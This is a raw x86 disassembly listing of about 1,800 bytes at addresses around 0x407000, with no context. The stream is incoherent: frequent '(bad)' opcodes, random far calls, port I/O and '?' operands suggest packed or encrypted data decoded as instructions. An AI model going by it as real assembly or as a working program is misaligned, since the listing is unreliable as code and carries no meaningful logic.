  40703b:	das    
  40703c:	dec    ecx
  40703d:	repnz mov BYTE PTR [ebx],al
  407040:	fsubr  st,st(7)
  407042:	shl    edx,cl
  407044:	addr16 mov al,0xf5
  407047:	push   esi
  407048:	fist   DWORD PTR [edi-0x5f]
  40704b:	nop
  40704c:	les    ecx,FWORD PTR [ebx]
  40704e:	out    0x24,al
  407050:	pop    eax
  407051:	ss jge 0x40702f
  407054:	cld    
  407055:	out    dx,al
  407056:	(bad)  
  407057:	in     eax,dx
  407058:	xchg   edx,eax
  407059:	ror    ebx,cl
  40705b:	inc    eax
  40705c:	mov    eax,0x608f060f
  407061:	sbb    DWORD PTR [ebx-0x7b],eax
  407064:	pop    eax
  407065:	in     al,dx
  407066:	shl    al,1
  407068:	je     0x40703a
  40706a:	shl    dl,1
  40706c:	aam    0x3b
  40706e:	das    
  40706f:	or     eax,0x607e4ccb
  407074:	mov    bl,0x14
  407076:	sub    eax,0xde2a7834
  40707b:	sar    ebx,cl
  40707d:	sub    DWORD PTR [ecx-0x1f],ecx
  407080:	xlat   BYTE PTR ds:[ebx]
  407081:	call   0x50ad:0x1979f162
  407088:	xchg   esp,eax
  407089:	(bad)  
  40708b:	sbb    esi,DWORD PTR [edx]
  40708d:	arpl   WORD PTR [edi-0x16b8bb9b],bx
  407093:	ret    
  407094:	mov    ecx,cs
  407096:	sbb    al,0x13
  407098:	or     al,0x62
  40709a:	repnz sbb bl,bh
  40709d:	call   0x6d3ec8e6
  4070a2:	xor    al,BYTE PTR [esi+0x7]
  4070a5:	loop   0x4070a8
  4070a7:	xor    DWORD PTR [ebx-0x376ba6be],ecx
  4070ad:	pop    ebx
  4070ae:	out    dx,al
  4070af:	into   
  4070b0:	scas   al,BYTE PTR es:[edi]
  4070b1:	xlat   BYTE PTR ds:[bx]
  4070b3:	cmp    BYTE PTR [ecx+0x430bcea3],dh
  4070b9:	call   ebp
  4070bb:	or     al,BYTE PTR [esi]
  4070bd:	(bad)
  4070c0:	aad    0xf
  4070c2:	xor    BYTE PTR es:[edi],dh
  4070c5:	test   al,0xfe
  4070c7:	jmp    0x40708d
  4070c9:	nop
  4070ca:	mov    esp,0xd0d1f1ae
  4070cf:	jnp    0x4070e2
  4070d1:	jo     0x4070b6
  4070d3:	enter  0xf51b,0xf3
  4070d7:	icebp  
  4070d8:	push   esi
  4070d9:	fsub   QWORD PTR [edx]
  4070db:	pop    ebx
  4070dc:	(bad)  
  4070dd:	jmp    0x7bc022b7
  4070e2:	dec    eax
  4070e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070e4:	or     eax,0x25f9279f
  4070e9:	adc    eax,0x519fabab
  4070ee:	inc    ebp
  4070ef:	sar    DWORD PTR [eax+ecx*1+0x4d66a3f9],0x79
  4070f7:	jmp    0x407166
  4070f9:	(bad)  
  4070fa:	cmc    
  4070fb:	lahf   
  4070fc:	inc    ebp
  4070fd:	bound  ebx,QWORD PTR [ebp+0x50]
  407100:	jg     0x40714d
  407102:	inc    esp
  407103:	xchg   DWORD PTR [edi+eiz*1],eax
  407106:	mov    ecx,DWORD PTR [edi]
  407108:	adc    al,0xf6
  40710a:	loope  0x407129
  40710c:	lods   eax,DWORD PTR ds:[esi]
  40710d:	add    ah,bl
  40710f:	push   0x1
  407111:	dec    ebx
  407112:	cwde   
  407113:	mov    ah,al
  407115:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  407117:	xlat   BYTE PTR ds:[ebx]
  407118:	aad    0xe0
  40711a:	and    BYTE PTR [eax-0x379d6777],ch
  407120:	mov    ebp,0x25a6112c
  407125:	or     DWORD PTR [eax+0x48],edx
  407128:	jmp    0x4341ec36
  40712d:	fcom   st(0)
  40712f:	and    edi,DWORD PTR [esi-0x474286f6]
  407135:	xor    BYTE PTR [eax],ah
  407137:	daa    
  407138:	push   ss
  407139:	(bad)  
  40713b:	lods   al,BYTE PTR ds:[esi]
  40713c:	jne    0x407193
  40713e:	hlt    
  40713f:	cmc    
  407140:	fcomp  QWORD PTR [ecx]
  407142:	data16 add BYTE PTR [ebx+0x688c02f9],ah
  407149:	jecxz  0x407134
  40714b:	pop    ss
  40714c:	push   ss
  40714d:	idiv   ebx
  40714f:	mov    ebx,0x1761e76f
  407154:	enter  0x28b5,0xc1
  407158:	mov    esp,0xeb90c9e7
  40715d:	in     eax,dx
  40715e:	nop
  40715f:	jge    0x4070ff
  407161:	mov    esp,0xda16ba5a
  407166:	cmp    ebx,edx
  407168:	ins    BYTE PTR es:[edi],dx
  407169:	pop    ds
  40716a:	inc    edx
  40716b:	pop    edi
  40716c:	lahf   
  40716d:	mov    ecx,0x67882988
  407172:	mov    WORD PTR [ecx+ebx*8+0x17],?
  407176:	out    dx,al
  407177:	dec    edx
  407178:	jne    0x40715f
  40717a:	push   0xf244c3ae
  40717f:	or     DWORD PTR [esi+0x72],esp
  407182:	shl    DWORD PTR [edx-0x5e],0x60
  407186:	repnz cld 
  407188:	mov    ebp,?
  40718a:	loop   0x407120
  40718c:	adc    ah,BYTE PTR [ecx+0x71a19c20]
  407192:	mov    dh,0xcd
  407194:	inc    edx
  407195:	dec    ebx
  407196:	xor    eax,DWORD PTR [ebp-0x34]
  407199:	adc    BYTE PTR [edx+0x7c314ea],ah
  40719f:	adc    dl,BYTE PTR [edi+0x14]
  4071a2:	outs   dx,BYTE PTR ds:[esi]
  4071a3:	mov    ch,0xe5
  4071a5:	inc    edx
  4071a6:	cld    
  4071a7:	mov    ebx,0x46516fa6
  4071ac:	das    
  4071ad:	xchg   BYTE PTR [esi+0x3e238bef],ch
  4071b3:	cmc    
  4071b4:	lahf   
  4071b5:	cdq    
  4071b6:	cdq    
  4071b7:	cwde   
  4071b8:	xor    ebp,DWORD PTR [eiz*8-0x528240c1]
  4071bf:	hlt    
  4071c0:	aas    
  4071c1:	into   
  4071c2:	mov    esi,0x762fc922
  4071c7:	pop    esp
  4071c8:	ret    0xfe67
  4071cb:	nop
  4071cc:	push   ebp
  4071cd:	xor    dl,BYTE PTR [ebx+eax*8]
  4071d0:	xchg   edx,eax
  4071d1:	retf   
  4071d2:	mov    edi,gs
  4071d4:	shr    bl,0xe0
  4071d7:	mov    ?,WORD PTR [esi]
  4071d9:	in     eax,dx
  4071da:	sbb    eax,0xa47b2916
  4071df:	mov    edx,0x4543a78f
  4071e4:	adc    eax,0x5dcc3c3c
  4071e9:	call   0xaf3b:0xf2c0fda2
  4071f0:	sbb    ebp,DWORD PTR [edx]
  4071f2:	rol    edi,cl
  4071f4:	inc    esi
  4071f5:	call   0x1bfdd48d
  4071fa:	jecxz  0x407250
  4071fc:	aad    0x10
  4071fe:	rcr    DWORD PTR [esi-0x53af6e62],0xd6
  407205:	sub    DWORD PTR [edi-0x14ff5414],ebx
  40720b:	cli    
  40720c:	push   ebx
  40720d:	jmp    0x23e5:0x91c9b2c9
  407214:	jbe    0x4071e4
  407216:	sbb    eax,0x5ad08f2f
  40721b:	mov    cl,0x25
  40721d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40721e:	sub    BYTE PTR [ecx+0x75],0xd5
  407222:	jb     0x407295
  407224:	inc    ebp
  407225:	cdq    
  407226:	or     DWORD PTR [ebp*2-0x3e4bf031],esi
  40722d:	pop    edi
  40722e:	data16 daa 
  407230:	pushf  
  407231:	dec    eax
  407232:	mov    eax,ds:0x9e8f3359
  407237:	addr16 mov dh,0x7a
  40723a:	pop    edi
  40723b:	(bad)  
  40723c:	jmp    0x72cd:0xa3ee2d12
  407243:	jo     0x40723a
  407245:	and    eax,0x5463c942
  40724a:	(bad)  
  40724b:	adc    esp,DWORD PTR [ebx]
  40724d:	jmp    0x40723c
  40724f:	xchg   DWORD PTR [edi],edx
  407251:	push   edi
  407252:	fs scas eax,DWORD PTR es:[edi]
  407254:	mov    BYTE PTR [eax-0x42],dh
  407257:	mov    ebx,0x75b4f026
  40725c:	xlat   BYTE PTR ds:[ebx]
  40725d:	popa   
  40725e:	and    BYTE PTR gs:[eax-0x12],ah
  407262:	hlt    
  407263:	pop    ss
  407264:	jecxz  0x4071fe
  407266:	jnp    0x407245
  407268:	pusha  
  407269:	test   ecx,esp
  40726b:	xlat   BYTE PTR ds:[ebx]
  40726c:	jge    0x4071f2
  40726e:	add    eax,0x1dce3d6b
  407273:	dec    ecx
  407274:	adc    esi,esi
  407276:	xchg   ecx,eax
  407277:	arpl   WORD PTR [edi],ax
  407279:	es loopne 0x40725c
  40727c:	sbb    DWORD PTR [ecx+edi*1],esp
  40727f:	out    0x31,al
  407281:	fdiv   st(1),st
  407283:	out    dx,eax
  407284:	inc    ebx
  407285:	adc    ebp,DWORD PTR [ebp+0x46]
  407288:	add    BYTE PTR [ebp-0x7d55f1c0],ch
  40728e:	mov    es,WORD PTR [edi-0x1c]
  407291:	mov    esi,0xdd70195f
  407296:	push   0xffffffda
  407298:	dec    ecx
  407299:	repz push eax
  40729b:	into   
  40729c:	shld   DWORD PTR [ebx],ebp,cl
  40729f:	les    esp,FWORD PTR [ebx]
  4072a1:	rcr    DWORD PTR [ecx],1
  4072a3:	jmp    0x4072e1
  4072a5:	inc    ebx
  4072a6:	or     al,0x2c
  4072a8:	sbb    bh,BYTE PTR [ecx+0x75697ef6]
  4072ae:	mov    ds:0x3b10dd9d,eax
  4072b3:	mov    cl,0xde
  4072b5:	cdq    
  4072b6:	cmc    
  4072b7:	pop    esp
  4072b8:	(bad)  
  4072b9:	lahf   
  4072ba:	jno    0x4072cc
  4072bc:	cmp    eax,DWORD PTR [esi-0x35758100]
  4072c2:	dec    eax
  4072c4:	stos   DWORD PTR es:[edi],eax
  4072c5:	cld    
  4072c6:	pop    ss
  4072c7:	call   DWORD PTR [edx-0x32906bcb]
  4072cd:	out    dx,eax
  4072ce:	mov    ds:0xd8a12a41,al
  4072d3:	xchg   edi,eax
  4072d4:	loop   0x407294
  4072d6:	in     al,0xc1
  4072d8:	jle    0x4072f5
  4072da:	imul   bh
  4072dc:	jne    0x40727d
  4072de:	(bad)  
  4072df:	aam    0x98
  4072e1:	push   ebp
  4072e2:	arpl   WORD PTR [esi+edx*1-0x7d],ax
  4072e6:	cld    
  4072e7:	mov    bl,0x30
  4072e9:	adc    DWORD PTR [edx],edi
  4072eb:	pusha  
  4072ec:	xchg   esp,eax
  4072ed:	xor    bh,ah
  4072ef:	dec    ebp
  4072f0:	sub    BYTE PTR [edi+0x2a581dd],bl
  4072f6:	outs   dx,BYTE PTR ds:[esi]
  4072f7:	dec    BYTE PTR [esi]
  4072f9:	cs xchg ebp,eax
  4072fb:	fst    DWORD PTR [edx-0x5b]
  4072fe:	(bad)  
  407300:	xchg   edi,eax
  407301:	fldcw  WORD PTR [eax-0x6a]
  407304:	mov    edi,0xffd71e6e
  407309:	xor    eax,0x96007422
  40730e:	mov    cs,WORD PTR ds:0x84bb5fef
  407314:	push   edi
  407315:	(bad)  
  407316:	adc    al,bh
  407318:	inc    ebp
  407319:	out    dx,al
  40731a:	jmp    0x4072a3
  40731c:	adc    eax,DWORD PTR [ecx+0xd]
  40731f:	and    ah,dl
  407321:	test   esp,eax
  407323:	mov    ecx,0xf8362fe4
  407328:	mov    ah,0xa2
  40732a:	outs   dx,BYTE PTR ds:[esi]
  40732b:	cli    
  40732c:	fsub   QWORD PTR ds:0xcd926de3
  407332:	mov    eax,0x87b93c3d
  407337:	sti    
  407338:	sub    edx,DWORD PTR [ecx-0x541b7da8]
  40733e:	push   ss
  40733f:	xor    DWORD PTR [edx*8+0x1ddffc82],ecx
  407346:	xchg   edi,ebp
  407348:	and    ebp,edx
  40734a:	xchg   edi,eax
  40734b:	adc    dl,0x41
  40734e:	aad    0xb1
  407350:	push   esp
  407351:	or     BYTE PTR [esi],bh
  407353:	hlt    
  407354:	mov    ah,BYTE PTR [edi+eiz*1-0x24]
  407358:	(bad)  
  407359:	jbe    0x407377
  40735b:	inc    eax
  40735c:	xor    DWORD PTR [eax],ecx
  40735e:	dec    esp
  40735f:	mov    dh,0x5d
  407361:	dec    ebp
  407362:	scas   eax,DWORD PTR es:[edi]
  407363:	push   0x57fcf8e2
  407368:	xor    al,0x67
  40736a:	shl    BYTE PTR [eax+0x387448dd],cl
  407370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407371:	lods   eax,DWORD PTR ds:[esi]
  407372:	out    dx,al
  407373:	cmp    al,0x98
  407375:	dec    esp
  407376:	mov    al,BYTE PTR [esi]
  407378:	or     DWORD PTR [esi-0x5b7f562a],edx
  40737e:	inc    eax
  40737f:	or     eax,0xa456b632
  407384:	fmul   DWORD PTR [esi+0x42]
  407387:	ins    BYTE PTR es:[edi],dx
  407388:	imul   esp,DWORD PTR ds:0xb0cd1f8f,0xffffffc5
  40738f:	push   ebp
  407390:	add    eax,0xd28f4ac8
  407395:	std    
  407396:	inc    ecx
  407397:	sub    BYTE PTR [edx-0x47],0xc6
  40739b:	fld    DWORD PTR [eax-0x3426a789]
  4073a1:	cmp    esp,esi
  4073a3:	(bad)
  4073a6:	xchg   edi,eax
  4073a7:	nop
  4073a8:	cmp    BYTE PTR ds:0xb52b34b6,dl
  4073ae:	call   0x99a62407
  4073b3:	mov    esi,0x9bc76458
  4073b8:	add    dh,al
  4073ba:	(bad)  
  4073bc:	addr16 mov ebx,0xea73a526
  4073c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073c3:	or     DWORD PTR [edx+0x197a3a6c],0x9c284267
  4073cd:	out    dx,al
  4073ce:	shl    DWORD PTR [ecx],1
  4073d0:	sub    al,0x2
  4073d2:	xor    dl,BYTE PTR [ebp+0x136c541d]
  4073d8:	xchg   esp,eax
  4073d9:	fnstenv [eax+0x43]
  4073dc:	cmp    DWORD PTR [edx-0x4b],esi
  4073df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073e0:	cmp    cl,BYTE PTR [eax-0x505557d8]
  4073e6:	daa    
  4073e7:	and    BYTE PTR [edi],0x2a
  4073ea:	fst    QWORD PTR [ecx]
  4073ec:	iret   
  4073ed:	jg     0x407441
  4073ef:	imul   eax,DWORD PTR [ebp+0x48],0xef17a24a
  4073f6:	imul   edi,DWORD PTR [ebp+0x2c],0x70
  4073fa:	mov    al,ds:0x2128553e
  4073ff:	data16 out 0xbe,al
  407402:	push   ebp
  407403:	mov    ds:0x117e605a,al
  407408:	mov    edi,0x7ff4451d
  40740d:	and    al,0xe4
  40740f:	dec    edx
  407410:	adc    dl,ch
  407412:	into   
  407413:	push   ecx
  407414:	and    DWORD PTR [edx],esp
  407416:	pusha  
  407417:	adc    eax,0xc4e4aa01
  40741c:	(bad)  
  40741d:	sub    eax,0xaeacaf9e
  407422:	aad    0x28
  407424:	push   ss
  407425:	dec    eax
  407426:	loopne 0x407456
  407428:	jbe    0x407402
  40742a:	add    al,0x4d
  40742c:	or     DWORD PTR [eax-0x1a],edi
  40742f:	adc    ah,BYTE PTR [edx+0x13]
  407432:	data16 cmc 
  407434:	and    BYTE PTR [edi+0x3e],ah
  407437:	sbb    esi,DWORD PTR [edx+0x71]
  40743a:	sti    
  40743b:	scas   al,BYTE PTR es:[edi]
  40743c:	mov    edi,0xdb477c8e
  407441:	mov    dl,cl
  407443:	inc    esi
  407444:	lods   eax,DWORD PTR ds:[esi]
  407445:	nop
  407446:	leave  
  407447:	xchg   DWORD PTR [ebx],esp
  407449:	sbb    edi,DWORD PTR [ebx+ebx*2-0x44]
  40744d:	imul   DWORD PTR [edi+0x7f38f6cf]
  407453:	addr16 pop ecx
  407455:	jno    0x4074cc
  407457:	mov    ebp,0x4baf8866
  40745c:	mov    ds:0x62bef9c0,al
  407461:	test   DWORD PTR [ecx+ecx*1-0x26],esp
  407465:	mov    ecx,0x3174ab28
  40746a:	lahf   
  40746b:	jmp    FWORD PTR [edx-0x4b76be64]
  407471:	xchg   ebx,eax
  407472:	mov    ecx,0x2241a1e2
  407477:	pop    esp
  407478:	stos   BYTE PTR es:[edi],al
  407479:	push   es
  40747a:	jle    0x407409
  40747c:	setnp  BYTE PTR [ecx+0x606f8078]
  407483:	cld    
  407484:	push   cs
  407485:	xchg   edx,eax
  407486:	mov    edi,esp
  407488:	mov    ah,0x28
  40748a:	iret   
  40748b:	loopne 0x4074ee
  40748d:	fiadd  DWORD PTR [edi-0x2e54d56c]
  407493:	and    ah,BYTE PTR [eax-0x385243c7]
  407499:	cld    
  40749a:	jmp    0xa00521f0
  40749f:	je     0x40743f
  4074a1:	test   eax,0x988bddc5
  4074a6:	xchg   esi,eax
  4074a7:	xor    bl,dl
  4074a9:	retf   
  4074aa:	mov    cl,0x8e
  4074ac:	repnz vpaddsb xmm0,xmm1,xmm4
  4074b1:	xor    dl,dl
  4074b3:	imul   esp,eax,0x19
  4074b6:	imul   ebp,DWORD PTR [eax-0x341e3edb],0x7fcb6028
  4074c0:	clc    
  4074c1:	aas    
  4074c2:	mov    esi,0xca9028e7
  4074c7:	push   0x18c6b048
  4074cc:	mov    eax,cs:0xb2717056
  4074d2:	mov    fs,WORD PTR [bx+di+0x6207]
  4074d7:	add    bh,BYTE PTR [ecx]
  4074d9:	lea    ebx,[eax]
  4074db:	fstp   TBYTE PTR [ebx]
  4074dd:	add    al,0xfc
  4074df:	pop    ecx
  4074e0:	push   ss
  4074e1:	fimul  DWORD PTR [eax+eax*4-0x17]
  4074e5:	mov    al,0xbf
  4074e7:	scas   eax,DWORD PTR es:[edi]
  4074e8:	rcl    BYTE PTR [ebx],0x7b
  4074eb:	hlt    
  4074ec:	ret    
  4074ed:	adc    esp,DWORD PTR [edx+0x7366d608]
  4074f3:	xor    DWORD PTR [edi-0x19],0xba18b303
  4074fa:	jl     0x4074bc
  4074fc:	mov    ebp,0x37afc15a
  407501:	(bad)  
  407502:	adc    eax,0x5216a4fb
  407507:	push   0xffffff99
  407509:	sub    cl,ah
  40750b:	sub    BYTE PTR [edi-0x25a13f36],ah
  407511:	dec    ebp
  407512:	adc    al,0xff
  407514:	mov    al,ds:0x18f17654
  407519:	ins    DWORD PTR es:[edi],dx
  40751a:	jmp    0x8f7c6d2c
  40751f:	jns    0x40752d
  407521:	sub    BYTE PTR [edx+0x6a0a7d8b],ch
  407527:	out    0xcc,eax
  407529:	fwait
  40752a:	push   es
  40752b:	scas   eax,DWORD PTR es:[edi]
  40752c:	cmp    esi,DWORD PTR [ecx]
  40752e:	popa   
  40752f:	mov    cl,0xb6
  407531:	(bad)  
  407532:	push   eax
  407533:	retf   0x7630
  407536:	fwait
  407537:	aas    
  407538:	daa    
  407539:	mov    ch,0x4e
  40753b:	xchg   ecx,eax
  40753c:	fs imul ebx,esi,0xb08610cd
  407543:	loopne 0x407517
  407545:	test   DWORD PTR [eax+eax*8],edx
  407548:	mov    esp,0x26efb522
  40754d:	push   cs
  40754e:	dec    esp
  40754f:	test   DWORD PTR cs:[edi+0x4e],edi
  407553:	dec    ebx
  407554:	pop    ebx
  407555:	pop    ss
  407556:	cmp    eax,0x7cb342a8
  40755b:	fwait
  40755c:	(bad)  
  40755d:	sar    DWORD PTR [ebp-0x13],0xa1
  407561:	push   es
  407562:	cli    
  407563:	adc    DWORD PTR [edx+0x64],ebx
  407566:	stos   BYTE PTR es:[edi],al
  407567:	adc    ecx,DWORD PTR [edi+0xc]
  40756a:	loop   0x407528
  40756c:	sti    
  40756d:	out    dx,eax
  40756e:	push   edi
  40756f:	mov    ah,0x99
  407571:	int3   
  407572:	inc    esi
  407573:	cmp    esi,DWORD PTR [esi]
  407575:	sub    BYTE PTR [ebx],bh
  407577:	(bad)  
  407578:	mov    al,0x53
  40757a:	hlt    
  40757b:	inc    eax
  40757c:	pop    ds
  40757d:	outs   dx,DWORD PTR ds:[esi]
  40757e:	push   es
  40757f:	jae    0x407534
  407581:	test   DWORD PTR [eax-0x7e],edx
  407584:	jnp    0x4075c5
  407586:	clc    
  407587:	sbb    al,0xb3
  407589:	aad    0x46
  40758b:	mov    cl,BYTE PTR [ecx]
  40758d:	inc    ebp
  40758e:	push   edi
  40758f:	lahf   
  407590:	pop    esi
  407591:	lock xor al,bl
  407594:	ret    0x2e6c
  407597:	and    esi,edi
  407599:	jl     0x4075ef
  40759b:	cmp    DWORD PTR [esi+ecx*8+0x3de9064d],esi
  4075a2:	push   edx
  4075a3:	test   eax,0x73eca0a0
  4075a8:	pop    eax
  4075a9:	imul   ebx,edx,0x75
  4075ac:	cld    
  4075ad:	mov    al,0xdf
  4075af:	cdq    
  4075b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075b1:	mov    bh,0x19
  4075b4:	adc    al,0xe0
  4075b6:	inc    ecx
  4075b7:	jmp    0x44c46108
  4075bc:	sbb    esp,DWORD PTR [ecx-0x162f6872]
  4075c2:	aas    
  4075c3:	mov    esi,0x9d4bcf53
  4075c8:	mov    edx,0xe2241949
  4075cd:	pop    ecx
  4075ce:	call   0x7ae7:0x85fdef5a
  4075d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075d6:	sbb    ch,al
  4075d8:	cmp    DWORD PTR ds:0x8c990cdf,edx
  4075de:	xchg   BYTE PTR [ebx+0x71],bh
  4075e1:	int3   
  4075e2:	and    eax,0x666272f8
  4075e7:	scas   eax,DWORD PTR es:[edi]
  4075e8:	aaa    
  4075e9:	push   ebp
  4075ea:	rol    BYTE PTR [eax+0x0],cl
  4075ed:	nop
  4075ee:	rcr    ecx,1
  4075f0:	dec    eax
  4075f1:	bound  esp,QWORD PTR [esi]
  4075f3:	and    ah,BYTE PTR [ecx]
  4075f5:	ja     0x40766c
  4075f7:	inc    ebx
  4075f8:	xor    eax,0x83e4cfaf
  4075fd:	adc    BYTE PTR [ebx],dl
  4075ff:	cdq    
  407600:	lahf   
  407601:	shl    BYTE PTR [eax],1
  407603:	sbb    BYTE PTR [edi],dh
  407605:	ret    
  407606:	jbe    0x4075b5
  407608:	(bad)  
  407609:	fsub   DWORD PTR [esi-0x5d]
  40760c:	inc    ebp
  40760d:	mov    edi,0x7afeb3
  407612:	popa   
  407613:	mov    ch,0xbb
  407615:	xchg   edx,eax
  407616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407617:	test   BYTE PTR [ebx],dh
  407619:	ja     0x407681
  40761b:	push   0xcef7d0f8
  407620:	in     eax,dx
  407621:	xchg   edx,eax
  407622:	inc    ecx
  407623:	and    eax,0xbe799653
  407628:	retf   0xd32e
  40762b:	add    DWORD PTR [edi+0x27],eax
  40762e:	stos   BYTE PTR es:[edi],al
  40762f:	push   esi
  407630:	xchg   esi,eax
  407631:	xchg   ecx,eax
  407632:	add    BYTE PTR ds:[edx+0x2],0xed
  407637:	ss adc edi,0x589a43c6
  40763e:	mov    edx,0x6a22eebb
  407643:	int    0x1b
  407645:	stos   BYTE PTR es:[edi],al
  407646:	out    dx,al
  407647:	mov    ebp,0x81f71e28
  40764c:	cmp    BYTE PTR [eax+0x4f],cl
  40764f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407650:	hlt    
  407651:	fidiv  WORD PTR [ebx]
  407653:	adc    eax,0x28dfd4d4
  407658:	push   esi
  407659:	lods   al,BYTE PTR ds:[esi]
  40765a:	je     0x4076d0
  40765c:	or     BYTE PTR [esp+eax*2+0x67],bl
  407660:	mov    WORD PTR gs:[ebx+0x4a4b743e],ss
  407667:	push   esi
  407668:	scas   al,BYTE PTR es:[edi]
  407669:	pop    ss
  40766a:	mov    ch,0x55
  40766c:	(bad)  
  40766d:	test   al,0xb8
  40766f:	xor    al,0xd1
  407671:	push   ds
  407672:	push   es
  407673:	adc    DWORD PTR [esi-0x1c519802],ecx
  407679:	fisubr DWORD PTR [ebx+eax*2+0x4389ab6e]
  407680:	cdq    
  407681:	loope  0x407615
  407683:	psrad  mm4,QWORD PTR ds:0x8105536e
  40768a:	xor    BYTE PTR [edx+0x12d314de],dl
  407690:	push   edi
  407691:	inc    ecx
  407692:	adc    dh,BYTE PTR [eax+esi*1-0x26]
  407696:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407697:	sub    eax,0x94739bf5
  40769c:	loope  0x40765f
  40769e:	test   eax,0xafb77311
  4076a3:	inc    eax
  4076a4:	iret   
  4076a5:	or     ebx,edi
  4076a7:	in     eax,dx
  4076a8:	ja     0x4076a4
  4076aa:	xor    dh,al
  4076ac:	js     0x407650
  4076ae:	rcl    DWORD PTR [ebx],cl
  4076b0:	mov    al,0x2b
  4076b2:	fld    QWORD PTR [edi+esi*2+0x61]
  4076b6:	cmp    al,0x6d
  4076b8:	add    eax,0xbc19f29f
  4076bd:	shr    BYTE PTR [ecx+0x331d6adb],cl
  4076c3:	(bad)  
  4076c4:	hlt    
  4076c5:	fs out dx,eax
  4076c7:	fs or  eax,0xc07b226a
  4076cd:	leave  
  4076ce:	call   0xd7d:0x111f19a8
  4076d5:	in     eax,dx
  4076d6:	call   0x369064e8
  4076db:	jne    0x407688
  4076dd:	xor    ah,BYTE PTR [edi-0x60a98c67]
  4076e3:	test   edi,eax
  4076e5:	push   ebx
  4076e6:	cmp    dl,al
  4076e8:	dec    edx
  4076e9:	push   esi
  4076ea:	xchg   BYTE PTR [edx-0x436bce38],bh
  4076f0:	(bad)  
  4076f1:	sti    
  4076f2:	jp     0x4076f3
  4076f4:	mov    ebp,0x771a32be
  4076f9:	pop    esp
  4076fa:	pushf  
  4076fb:	add    BYTE PTR [edi+0x4fcd376e],ch
  407701:	test   DWORD PTR [ebx],edx
  407703:	sub    eax,edi
  407705:	mov    esp,DWORD PTR [edx+0x492fb59e]
  40770b:	popa   
  40770c:	or     DWORD PTR [ebx+0x4d611230],0xffffffa6
  407713:	popa   
  407714:	xor    al,0xae
  407716:	test   BYTE PTR [eax],0x58
  407719:	sbb    BYTE PTR [ebx+0x2d360c99],dl
  40771f:	or     al,ch
  407721:	pop    es
  407722:	repz sbb esp,edx
  407725:	arpl   WORD PTR ds:0xcad265c7,sp
  40772b:	or     eax,0xc90aceb5
  407730:	mov    esp,DWORD PTR [esi-0xa8c0303]
  407736:	and    eax,0xb8fc5304
  40773b:	mov    ds:0x32e9796f,al
  407740:	in     eax,0xcc
  407742:	and    BYTE PTR [eax+0x77],0x35
  407746:	xchg   esi,eax
  407747:	inc    edi
  407748:	loop   0x4076d4
  40774a:	cld    
  40774b:	mov    gs,WORD PTR [esi-0x74]
  40774e:	aas    
  40774f:	xor    eax,0xfda5440
  407754:	and    eax,0x2e671f78
  407759:	mov    ecx,DWORD PTR [eax+0x51]
  40775c:	ins    DWORD PTR es:[edi],dx
  40775d:	dec    esi
  40775e:	pusha  
  40775f:	test   eax,0x50c28b28
  407764:	cmp    edx,0x2b
  407767:	clc    
  407768:	inc    edi
  407769:	into   
  40776a:	mov    ebp,0x6e75b4f1
  40776f:	ficom  WORD PTR [edx+0x71540aae]
  407775:	inc    edx
  407776:	dec    ebx
  407777:	xchg   esi,eax
  407778:	xchg   BYTE PTR [eax-0x2c],ah
  40777b:	xchg   BYTE PTR [ebx-0x7770ac0],ch
  407781:	inc    edi
  407782:	jmp    0x74661b39
  407787:	jns    0x4077db
  407789:	mov    esp,0xd69a9ab
  40778e:	aam    0xe5
  407790:	adc    ecx,esp
  407792:	call   0xcf3eaec3
  407797:	in     eax,dx
  407798:	adc    al,0xc4
  40779a:	and    al,0x31
  40779c:	outs   dx,BYTE PTR ds:[esi]
  40779d:	mov    bh,0x92
  40779f:	xor    edi,DWORD PTR [edx-0x5b4efad0]
  4077a5:	fwait
  4077a6:	ins    DWORD PTR es:[edi],dx
  4077a7:	pop    edi
  4077a8:	and    BYTE PTR [ebx],dl
  4077aa:	jnp    0x40779d
  4077ac:	jae    0x407765
  4077ae:	gs jg  0x4077e6
  4077b1:	inc    esi
  4077b2:	aas    
  4077b3:	xchg   esi,eax
  4077b4:	test   DWORD PTR [esi+eiz*8],esi
  4077b7:	into   
  4077b8:	pusha  
  4077b9:	pop    ss
  4077ba:	xchg   ebx,eax
  4077bb:	cmp    eax,DWORD PTR [edx]
  4077bd:	or     bl,BYTE PTR [ebp+0x2cbba333]
  4077c3:	push   esi
  4077c4:	sub    dl,ch
  4077c6:	adc    DWORD PTR [esi+0xb],edx
  4077c9:	loope  0x407831
  4077cb:	lods   al,BYTE PTR ds:[esi]
  4077cc:	sbb    bh,BYTE PTR [ebp+0x81233a4]
  4077d2:	inc    esi
  4077d3:	(bad)  
  4077d4:	mov    al,ds:0xf245e8ef
  4077d9:	cmp    DWORD PTR [ecx],esp
  4077db:	(bad)  
  4077dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077de:	mov    ebx,0xf4a7dc1b
  4077e3:	daa    
  4077e4:	mov    ds:0x47c2e994,eax
  4077e9:	outs   dx,BYTE PTR ds:[esi]
  4077ea:	ret    0x382a
  4077ed:	add    al,0x0
  4077ef:	push   0x38
  4077f1:	add    al,0x1
  4077f3:	cwde   
  4077f4:	add    eax,0x9b01937a
  4077f9:	call   0x1f9:0x2a985370
  407800:	push   es
  407801:	loopne 0x4077fb
  407803:	fild   QWORD PTR [eax+0x5e]
  407806:	xlat   BYTE PTR ds:[ebx]
  407807:	dec    edx
  407808:	xor    BYTE PTR [edx+0x2c],0xf1
  40780c:	inc    ebp
  40780d:	and    eax,0x39d83621
  407812:	dec    ecx
  407813:	inc    ecx
  407814:	test   BYTE PTR [ebp+0x53dbf02a],bh
  40781a:	jno    0x407881
  40781c:	mov    dh,0x48
  40781e:	popa   
  40781f:	push   ecx
  407820:	xor    edi,DWORD PTR [edi-0x4b]
  407823:	in     al,dx
  407824:	mov    edx,0xc70b36d5
  407829:	lock rol DWORD PTR [ebx],1
  40782c:	xchg   ebp,eax
  40782d:	emms   
  40782f:	mov    ah,0x67
